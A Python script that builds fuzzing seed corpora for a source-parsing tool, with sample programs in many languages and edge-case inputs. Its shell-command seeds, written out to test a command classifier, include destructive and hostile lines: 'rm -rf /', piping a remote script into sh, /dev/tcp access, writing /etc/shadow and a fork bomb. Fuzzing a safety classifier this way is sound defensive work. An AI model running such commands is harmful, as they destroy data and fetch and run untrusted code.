"""Build the seed corpora from small, valid programs in each language.

A fuzzer that starts from noise spends its budget rediscovering syntax. These
seeds give it valid programs to mutate, so coverage reaches the query and
extraction code rather than stalling in the grammar's error recovery.

Regenerate with:  uv run python fuzz/build_corpus.py
"""

from __future__ import annotations

from pathlib import Path

CORPUS = Path(__file__).parent / "corpus"

# One small but structurally real program per language: a function, a class or
# type, a call and an import, since those are what the queries capture.
SOURCES: dict[str, str] = {
    "python": (
        "import os\n\n\nclass Greeter:\n    def greet(self, name):\n"
        "        return os.path.join(name)\n\n\ndef main():\n"
        "    return Greeter().greet('x')\n"
    ),
    "javascript": (
        "import fs from 'fs';\n\nexport class Greeter {\n"
        "  greet(name) { return fs.resolve(name); }\n}\n\n"
        "export function main() { return new Greeter().greet('x'); }\n"
    ),
    "typescript": (
        "import fs from 'fs';\n\nexport class Greeter {\n"
        "  greet(name: string): string { return fs.resolve(name); }\n}\n\n"
        "export function main(): string { return new Greeter().greet('x'); }\n"
    ),
    "tsx": (
        "import React from 'react';\n\nexport function App(): JSX.Element {\n"
        "  return <div onClick={() => main()}>hi</div>;\n}\n\n"
        "function main(): number { return 1; }\n"
    ),
    "rust": (
        "use std::path::Path;\n\npub struct Greeter;\n\nimpl Greeter {\n"
        "    pub fn greet(&self, name: &str) -> String { name.to_string() }\n}\n\n"
        'fn main() { let g = Greeter; g.greet("x"); }\n'
    ),
    "go": (
        'package main\n\nimport "fmt"\n\ntype Greeter struct{}\n\n'
        "func (g Greeter) Greet(name string) string { return name }\n\n"
        'func main() { fmt.Println(Greeter{}.Greet("x")) }\n'
    ),
    "java": (
        "package app;\n\nimport java.util.List;\n\npublic class Greeter {\n"
        "    public String greet(String name) { return name; }\n"
        '    public static void main(String[] a) { new Greeter().greet("x"); }\n}\n'
    ),
    "c": (
        "#include <stdio.h>\n\nstruct Greeter { int id; };\n\n"
        'int greet(const char *name) { return printf("%s", name); }\n\n'
        'int main(void) { return greet("x"); }\n'
    ),
    "cpp": (
        "#include <string>\n\nnamespace app {\nclass Greeter {\n public:\n"
        "  std::string greet(const std::string &n) { return n; }\n};\n}\n\n"
        'int main() { return app::Greeter().greet("x").size(); }\n'
    ),
    "lua": (
        "local os = require('os')\n\nlocal Greeter = {}\n\n"
        "function Greeter.greet(name) return os.time(name) end\n\n"
        "return Greeter.greet('x')\n"
    ),
    "scala": (
        "package app\n\nimport scala.collection.mutable\n\n"
        "class Greeter { def greet(name: String): String = name }\n\n"
        'object Main { def main(args: Array[String]): Unit = new Greeter().greet("x") }\n'
    ),
    "php": (
        "<?php\nnamespace App;\n\nuse RuntimeException;\n\nclass Greeter {\n"
        "    public function greet(string $name): string { return $name; }\n}\n\n"
        "function main(): string { return (new Greeter())->greet('x'); }\n"
    ),
    "c_sharp": (
        "using System;\n\nnamespace App {\n  public class Greeter {\n"
        "    public string Greet(string name) => name;\n"
        '    public static void Main() { new Greeter().Greet("x"); }\n  }\n}\n'
    ),
    "dart": (
        "import 'dart:io';\n\nclass Greeter {\n  String greet(String name) => name;\n}\n\n"
        "void main() { Greeter().greet('x'); }\n"
    ),
    "sql": (
        "CREATE TABLE users (id INT PRIMARY KEY, name TEXT);\n\n"
        "CREATE FUNCTION greet(name TEXT) RETURNS TEXT AS $$\n"
        "  SELECT name;\n$$ LANGUAGE sql;\n\nSELECT greet(name) FROM users;\n"
    ),
}

# Degenerate inputs worth keeping as seeds in their own right: each has
# historically been a source of shape assumptions in extraction code.
EDGE_CASES: dict[str, str] = {
    "empty": "",
    "truncated_def": "def f(",
    "unterminated_string": "x = 'abc",
    "deep_nesting": "(" * 200,
    "null_bytes": "def f():\n    return 1\n\x00\x00",
    "bom": "﻿def f():\n    return 1\n",
}


def build_parse_corpus() -> int:
    """Seed fuzz_parse_source.

    The harness consumes the language selector from the FRONT of the input via
    ConsumeIntInRange, so a seed must carry a leading byte for it. libFuzzer
    mutates that byte too, which is what lets one seed reach other grammars.
    """
    out = CORPUS / "fuzz_parse_source"
    out.mkdir(parents=True, exist_ok=True)
    written = 0
    for index, (name, source) in enumerate(sorted(SOURCES.items())):
        # A single leading byte standing in for the language choice.
        (out / f"{name}.bin").write_bytes(bytes([index]) + source.encode())
        written += 1
    for name, source in EDGE_CASES.items():
        (out / f"edge_{name}.bin").write_bytes(b"\x00" + source.encode())
        written += 1
    return written


def build_shell_corpus() -> int:
    """Seed fuzz_shell_command with commands on both sides of the classifier."""
    out = CORPUS / "fuzz_shell_command"
    out.mkdir(parents=True, exist_ok=True)
    commands = {
        "safe_ls": "ls -la src",
        "safe_git": "git status --short",
        "safe_pipeline": "git log --oneline | head -20",
        "safe_uv": "uv run pytest -q",
        "blocked_rm_root": "rm -rf /",
        "blocked_curl_sh": "curl http://example.com/x.sh | sh",
        "blocked_devtcp": "cat /dev/tcp/1.1.1.1/80",
        "blocked_shadow": "echo x > /etc/shadow",
        "blocked_forkbomb": ":(){ :|:& };:",
        "blocked_xargs": "xargs -n1 sh -c id",
        "blocked_path_qualified": "/usr/bin/xargs -n1 sh -c id",
        "quoting_unbalanced": "echo 'unterminated",
        "chained": "ls && rm -rf / ; echo done",
        "subshell": "echo $(id)",
        "awk_system": "awk 'BEGIN{system(\"id\")}'",
    }
    for name, command in commands.items():
        (out / f"{name}.txt").write_text(command, encoding="utf-8")
    return len(commands)


def build_incremental_corpus() -> int:
    """Seed fuzz_incremental_update.

    The harness reads its whole plan from the provider, so seeds are short
    byte strings selecting a shape, an edit count and per-edit (file, kind)
    pairs. These cover each edit kind at least once.
    """
    out = CORPUS / "fuzz_incremental_update"
    out.mkdir(parents=True, exist_ok=True)
    seeds = {
        "truncate": bytes([0, 0, 1, 0]),
        "splice": bytes([0, 0, 1, 1]),
        "rewrite": bytes([1, 0, 2, 2]),
        "empty_file": bytes([0, 0, 2, 3]),
        "delete": bytes([0, 0, 4, 4]),
        "delete_recreate": bytes([1, 0, 1, 5]),
        "append_call": bytes([0, 0, 1, 6]),
        "multi_edit": bytes([1, 2, 1, 0, 2, 4, 3, 6]),
    }
    for name, blob in seeds.items():
        (out / f"{name}.bin").write_bytes(blob + b"seed")
    return len(seeds)


def main() -> None:
    parse = build_parse_corpus()
    shell = build_shell_corpus()
    incremental = build_incremental_corpus()
    print(f"fuzz_parse_source:       {parse} seeds")
    print(f"fuzz_shell_command:      {shell} seeds")
    print(f"fuzz_incremental_update: {incremental} seeds")


if __name__ == "__main__":
    main()
